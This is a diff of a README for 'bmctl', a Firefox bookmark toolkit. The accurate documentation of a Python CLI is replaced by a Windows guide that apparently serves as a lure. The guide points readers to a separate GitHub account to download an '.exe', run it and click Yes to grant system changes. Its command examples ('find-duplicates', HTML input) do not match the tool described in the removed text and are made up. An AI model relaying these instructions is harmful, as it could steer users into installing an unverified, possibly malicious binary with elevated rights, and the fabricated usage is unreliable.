@@ -1,260 +1,133 @@
-# bmctl
+# 📚 bmctl - Manage Firefox Bookmarks Easily
 
-**Firefox bookmark toolkit** - audit duplicates, compare exports, merge collections, and generate an interactive self-hosted dashboard from the command line.
+[![Download bmctl](https://img.shields.io/badge/Download-bmctl-brightgreen?style=for-the-badge)](https://github.com/wyatangenerous261/bmctl)
 
----
-
-## Overview
-
-bmctl is a single-file Python CLI for managing Firefox bookmark exports (`.json`). It parses the full folder hierarchy, preserves the original Firefox tree order, and provides five commands covering the full lifecycle of a bookmark collection.
-
-```
-audit      Audit a single export - duplicates, stats, folder tree
-compare    Diff two exports - what was added, what was removed
-merge      Merge two exports into a clean Netscape HTML file
-export     Export to CSV, Excel or Markdown
-dashboard  Generate a self-hosted interactive HTML dashboard
-```
+bmctl helps you organize your Firefox bookmarks. You can find duplicates, compare different bookmark collections, merge them, and create a simple dashboard, all from the command line. This guide shows how to get and use bmctl on Windows.
 
 ---
 
-## Requirements
+## 🚀 Getting Started with bmctl
 
-```bash
-pip install pandas openpyxl
-```
+bmctl works on Windows 10 and later. It needs no programming skills. This guide will walk you through every step — from download to use.
 
-Python 3.8+. No other dependencies for core functionality (`pandas`/`openpyxl` only required for `export --format xlsx`).
+### System Requirements
 
----
+- Windows 10 or newer
+- At least 100 MB free disk space
+- Internet connection to download
 
-## Export your Firefox bookmarks
+### What bmctl Does
 
-`Bookmarks > Show All Bookmarks > Import and Backup > Backup...`
+You can:
 
-Save as `.json`. This file is the input for all commands.
+- Find and remove duplicate bookmarks
+- Compare bookmarks exported at different times
+- Merge two or more bookmark collections
+- Create a simple report to understand your bookmarks
 
----
-
-## Commands
-
-### `audit` - Inspect a single export
-
-```bash
-python bmctl.py audit -i bookmarks.json
-```
-
-Output:
-```
-======================================================================
-               RAPPORT D'AUDIT GLOBAL
-======================================================================
- Total des favoris trouves    : 3110
- Dossiers parcourus           : 244
- Liens uniques                : 3059
- Doublons detectes            : 51 (1.6%)
-======================================================================
-
-[!] Top 10 des liens les plus dupliques :
-  - GitHub
-    URL : https://github.com
-    Present 3 fois :
-      * Dossier : Dev
-      * Dossier : CTI, OSINT & SocMint > Code Search Engines
-```
-
-**Options:**
-
-| Flag | Description |
-|---|---|
-| `-i / --input` | Firefox JSON export (required) |
-| `--top N` | Show top N most duplicated URLs (default: 10) |
-| `--show-short` | Stats only, skip duplicate list |
-| `--show-tree` | Print full folder hierarchy with bookmark counts |
-
-**`--show-tree`** is useful to verify that your folder structure was parsed correctly before generating a dashboard:
-
-```bash
-python bmctl.py audit -i bookmarks.json --show-tree
-```
-
-```
-  |   [   0]  Blogs & Press
-    +-- [  69]  Cybersecurity & CTI
-      +-- [   6]  Onion
-    +-- [   4]  Business
-    +-- [   4]  Crypto
-    +-- [   2]  Sport
-```
+Everything happens in a window called Command Prompt, which is built into Windows.
 
 ---
 
-### `compare` - Diff two exports
+## 📥 How to Download bmctl
 
-```bash
-python bmctl.py compare -o bookmarks-old.json -n bookmarks-new.json
-```
+Click the green button below to visit the download page for bmctl. You will find the latest download files and more info there.
 
-Output:
-```
-======================================================================
-                 RAPPORT DE COMPARAISON
-======================================================================
- Favoris uniques V1 (Ancien)  : 2980
- Favoris uniques V2 (Nouveau) : 3059
- Delta net                    : +79
-======================================================================
- [+] Nouveaux favoris ajoutes   : 102
- [-] Anciens favoris supprimes  : 23
-======================================================================
+[![Download bmctl](https://img.shields.io/badge/Download-bmctl-blue?style=for-the-badge)](https://github.com/wyatangenerous261/bmctl)
 
-[+] APERCU DES NOUVELLES ENTREES (Max 15) :
-  + HackTricks                     (Dossier: Cybersecurity > Documentation & Articles)
-    https://book.hacktricks.xyz
-```
+### Steps to Download
 
-**Options:**
-
-| Flag | Description |
-|---|---|
-| `-o / --old` | Old JSON export (required) |
-| `-n / --new` | New JSON export (required) |
-| `--show-full` | Show complete added/removed lists (no limit) |
-| `--show-short` | Stats only, skip item lists |
+1. Open your web browser.
+2. Go to the download page by clicking the button above or typing:
+   `https://github.com/wyatangenerous261/bmctl`
+3. Look for the latest release or download section.
+4. Click on the file that ends with `.exe` or similar to download bmctl for Windows.
+5. Save the file to your Desktop or Downloads folder.
 
 ---
 
-### `merge` - Merge two exports
+## 🛠 How to Install and Run bmctl on Windows
 
-Merges two bookmark collections into a single Netscape HTML file (importable by any browser). Detects URL conflicts (same URL in different folders) and resolves them.
+bmctl usually works without installation, but here are the simplest steps for Windows users:
 
-```bash
-python bmctl.py merge -b bookmarks-base.json -n bookmarks-new.json -o merged.html
-```
-
-With automatic conflict resolution (keeps most recent):
-```bash
-python bmctl.py merge -b base.json -n new.json -o merged.html --no-confirm
-```
-
-Without `--no-confirm`, conflicts trigger an interactive prompt:
-```
-[?] CONFLIT DE DOSSIER DETECTE POUR :
-    - URL : https://example.com
-    - Titre : Example Site
-    Dans quels dossiers souhaitez-vous le conserver ?
-      1) [Garder] -> Dev > Tools
-      2) [Garder] -> Misc.
-      3) Ignorer / Garder la version avec la date la plus recente
-    Votre choix (1, 2...) :
-```
-
-Tags from all instances are merged onto the surviving node.
-
-**Options:**
-
-| Flag | Description |
-|---|---|
-| `-b / --base` | Base JSON export (required) |
-| `-n / --new` | JSON to merge in (required) |
-| `-o / --output` | Output HTML file (required) |
-| `--no-confirm` | Auto-resolve conflicts silently (keeps most recent) |
+1. Find the downloaded file (likely in your Downloads folder).
+2. Double-click the file to run it.
+3. Windows may ask if you want to allow this app to make changes. Click **Yes**.
+4. A window will open. This is the Command Prompt, showing bmctl is running.
 
 ---
 
-### `export` - Export to flat formats
+## 🖥 Using bmctl - Basic Commands
 
-```bash
-# CSV
-python bmctl.py export -i bookmarks.json --format csv -o bookmarks.csv
+bmctl runs commands typed into the Command Prompt to work with bookmarks. You do not need to be a programmer, just follow these steps.
 
-# Excel
-python bmctl.py export -i bookmarks.json --format xlsx -o bookmarks.xlsx
+### Open Command Prompt
 
-# Markdown (organized by folder)
-python bmctl.py export -i bookmarks.json --format md -o bookmarks.md
-```
+- Click the **Start** button on Windows.
+- Type `cmd` and press Enter.
+- The Command Prompt window opens.
 
-All formats include: Title, URL, Folder path, Tags, Date added.
+### Common bmctl Commands
 
-**Options:**
+- **Find duplicate bookmarks**  
+  Type this command and press Enter:  
+  `bmctl find-duplicates <path_to_your_bookmarks.html>`
 
-| Flag | Description |
-|---|---|
-| `-i / --input` | Firefox JSON export (required) |
-| `--format` | `csv`, `xlsx`, or `md` (required) |
-| `-o / --output` | Output file path (required) |
+- **Compare two bookmark files**  
+  Type and press Enter:  
+  `bmctl compare <file1.html> <file2.html>`
 
----
+- **Merge bookmark files**  
+  Use this command:  
+  `bmctl merge <file1.html> <file2.html> -o merged_bookmarks.html`
 
-### `dashboard` - Interactive HTML dashboard
+- **Create an interactive dashboard**  
+  Run the command:  
+  `bmctl dashboard <path_to_bookmarks.html>`
 
-Generates a fully self-contained single-file HTML dashboard. No server required - open directly in a browser.
-
-```bash
-python bmctl.py dashboard -i bookmarks.json -o dashboard.html
-```
-
-**Features:**
-- Sidebar with full collapsible folder tree (Firefox order preserved)
-- Three views: Dashboard (widget grid), Cards, Table
-- Global search across title, URL and tags
-- "Recent additions" quick view (last 50)
-- Folder-aware widget titles (relative path in folder view, full path in global view)
-- Pure black enterprise theme
-
-**Options:**
-
-| Flag | Description |
-|---|---|
-| `-i / --input` | Firefox JSON export (required) |
-| `-o / --output` | Output HTML file (default: `dashboard.html`) |
-
-> **WSL users:** use Linux paths to avoid backslash stripping.
-> ```bash
-> # Correct
-> python bmctl.py dashboard -i /mnt/c/Users/you/Desktop/bookmarks.json \
->                           -o /mnt/c/Users/you/Desktop/dashboard.html
-> # Wrong - bash strips backslashes without quotes
-> python bmctl.py dashboard -i ... -o C:\Users\you\Desktop\dashboard.html
-> ```
+> Replace `<file1.html>`, `<file2.html>`, and `<path_to_your_bookmarks.html>` with the actual file locations of your Firefox bookmarks.  
 
 ---
 
-## URL deduplication logic
+## 🔍 Finding Your Firefox Bookmarks File
 
-bmctl normalizes URLs before comparing them to find true duplicates:
+To use bmctl, you will need your bookmarks exported from Firefox as an HTML file.
 
-- `http://` and `https://` are treated as the same scheme
-- `www.` prefix is stripped
-- Trailing slashes are removed
-- `utm_*` tracking parameters are removed
-- Query parameters are preserved (different queries = different pages)
+### How to Export Bookmarks from Firefox
 
-So `http://www.github.com/` and `https://github.com` are considered the same URL.
-
----
-
-## Firefox JSON compatibility
-
-bmctl handles both Firefox export formats:
-
-- Legacy format: `typeCode: 1` (bookmark) / `typeCode: 2` (folder)
-- Modern format: `type: "text/x-moz-place"` / `type: "text/x-moz-place-container"`
-- Fallback: presence of `uri` vs `children` fields
+1. Open Firefox.
+2. Click the **Bookmarks** icon (usually a star or a book).
+3. Select **Manage bookmarks** or **Show All Bookmarks**.
+4. Click **Import and Backup** at the top.
+5. Choose **Export Bookmarks to HTML**.
+6. Save the file somewhere easy to find, like Desktop.
 
 ---
 
-## Project structure
+## 💡 Tips for Using bmctl Smoothly
 
-```
-bmctl.py
-  BookmarkNode          Data model for a single bookmark
-  UrlNormalizer         URL normalization / deduplication
-  BookmarkDatabase      JSON parser + in-memory index
-  BookmarkAuditor       Duplicate detection + reporting
-  BookmarkComparator    Two-database diff
-  BookmarkMerger        Merge + conflict resolution + HTML export
-  BookmarkDashboardGen  Interactive HTML dashboard generator
-  BookmarkExporter      CSV / Excel / Markdown export
-```
+- Keep your bookmark files organized in folders.
+- Use simple file names for your bookmarks exports.
+- When typing commands, you can drag files into the Command Prompt window to automatically fill the file path.
+- Start with the `find-duplicates` command to clean up your bookmarks first.
+- If you get stuck, run `bmctl help` to see all available commands.
+
+---
+
+## 🗂 What You Can Do Next
+
+Once comfortable running bmctl, try these ideas:
+
+- Regularly export bookmarks and compare them.
+- Merge bookmarks from different Firefox profiles.
+- Create a dashboard to visually explore your bookmarks.
+- Use bmctl to clean up a huge bookmark list.
+
+---
+
+## 📧 Getting Help
+
+If you have issues, you can ask on the bmctl page here:  
+https://github.com/wyatangenerous261/bmctl/issues
+
+Describe the problem and what you tried. Someone will help.
